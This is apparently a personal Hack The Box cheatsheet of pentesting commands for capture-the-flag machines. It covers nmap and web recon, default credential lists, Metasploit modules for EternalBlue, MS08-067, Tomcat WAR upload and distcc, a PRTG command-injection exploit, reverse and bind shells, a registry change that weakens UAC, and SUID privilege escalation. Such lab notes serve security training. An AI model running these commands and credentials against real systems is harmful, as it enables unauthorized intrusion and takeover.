# HTB Cheatsheet — Quick Reference

---

## 1. Before You Start (Arch Linux)

```bash
# Make sure tun0 is in trusted zone (or reverse shells WILL fail)
sudo firewall-cmd --zone=trusted --add-interface=tun0 --permanent

# Activate venv for impacket/python tools
source ~/Work/htb-zach-tracker/venv/bin/activate

# Confirm VPN IP
ip addr show tun0
```

---

## 2. Recon

### Port Scan
```bash
nmap -sV -Pn -T4 <IP>              # fast service scan
nmap -sV -sC -p- --min-rate 5000 <IP>  # full port + default scripts
nmap -p <ports> --script vuln <IP>      # vuln scan specific ports
```

### Web
```bash
whatweb http://<IP>                          # fingerprint
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,jsp
nikto -h http://<IP>
```

### SMB (139/445)
```bash
smbclient -L //<IP> -N                     # list shares (no auth)
smbmap -H <IP>                              # check permissions
smbclient //<IP>/<share> -N                 # connect to share
nmap -p 445 --script smb-vuln* <IP>         # check SMB vulns
nmap -p 445 --script smb-vuln-ms08-067 --script-args unsafe=1 <IP>  # MS08-067 needs unsafe=1
```

### FTP (21)
```bash
ftp <IP>                                    # try anonymous:(blank)
```

---

## 3. Exploit Patterns

### Default Creds — Always Try First
| Service | Common Creds |
|---|---|
| Tomcat Manager | `tomcat:tomcat`, `tomcat:s3cret`, `admin:admin` |
| PRTG | `prtgadmin:prtgadmin` |
| SSH/FTP | `admin:admin`, `root:root`, `anonymous:(blank)` |

### Tomcat (8080)
```bash
# Hit /manager/html — click Cancel to see 401 page (often leaks creds)
curl http://<IP>:8080/manager/html
# Test creds
curl -u user:pass http://<IP>:8080/manager/html -o /dev/null -w "%{http_code}"
# WAR upload shell
use exploit/multi/http/tomcat_mgr_upload
```

### SMB — Windows
```bash
# EternalBlue (Win7/XP/2008)
use auxiliary/admin/smb/ms17_010_command
use exploit/windows/smb/ms08_067_netapi    # XP — use 32-bit payload!
```

### PRTG
```bash
# Config files at: C:\ProgramData\Paessler\PRTG Network Monitor\
# Look for PRTG Configuration.old.bak — has plaintext passwords
# Password often has year — try incrementing (2018 → 2019)
# RCE via notification command injection (CVE-2018-9276)
searchsploit -m windows/webapps/46527.sh
```

---

## 4. Getting a Shell

### Reverse Shell (most common)
```bash
# Listener
nc -lvnp 4444

# Metasploit
set LHOST tun0
set LPORT 4444

# If reverse shell fails — check firewall first!
sudo firewall-cmd --zone=trusted --add-interface=tun0
```

### Bind Shell (when reverse fails)
```bash
# Target listens, you connect
set PAYLOAD <os>/shell/bind_tcp
set RHOST <IP>
nc <IP> <port>
```

### Windows Shell Access
```bash
# psexec (need admin creds + SMB 445)
python3 /usr/bin/psexec.py 'user:pass@<IP>'

# evil-winrm (need creds + WinRM 5985)
evil-winrm-py -i <IP> -u user -p 'pass'

# If psexec gives STATUS_ACCESS_DENIED
# → disable UAC remote restriction via command execution first
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

### Command Execution (no interactive shell)
```bash
# When reverse/bind shells won't work — execute commands directly
use exploit/unix/misc/distcc_exec           # distccd
set PAYLOAD cmd/unix/generic
set CMD <command>

# Pipe results: redirect output to file, read via FTP/SMB/web
```

---

## 5. Finding Flags

### Linux
```bash
find / -name user.txt 2>/dev/null
find / -name root.txt 2>/dev/null
cat /home/*/user.txt
cat /root/root.txt
```

### Windows
```cmd
dir C:\Users /s /b | findstr user.txt
type C:\Users\<user>\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
:: XP uses "Documents and Settings" not "Users"
```

### Metasploit
```
search -f user.txt
search -f root.txt
```

---

## 6. Privilege Escalation

### Linux — Quick Checks
```bash
sudo -l                                     # sudo permissions
find / -perm -4000 -type f 2>/dev/null      # SUID binaries
# SUID nmap → nmap --interactive → !sh
```

### Windows
```cmd
whoami /priv                                # check privileges
net localgroup administrators               # who's admin
```

---

## 7. Searchsploit
```bash
searchsploit <service> <version>
searchsploit -x <path>                     # view exploit
searchsploit -m <path>                     # copy to current dir
```

---

## 8. Arch Linux Fixes

| Problem | Fix |
|---|---|
| Reverse shells fail on ALL machines | `sudo firewall-cmd --zone=trusted --add-interface=tun0 --permanent` |
| MSF encoder errors | `set ENCODER generic/none` |
| Fish shell breaks exploits | Switch to `bash` for smbclient/backtick commands |
| psexec.py module errors | `pip install six impacket` in venv |
| evil-winrm NTLM fails | Use `psexec.py` instead (Python 3.14 compat issue) |
| `!` in passwords breaks exploits | Use passwords without `!` — URL encoding destroys it |
| nmap "Host seems down" | Add `-Pn` |
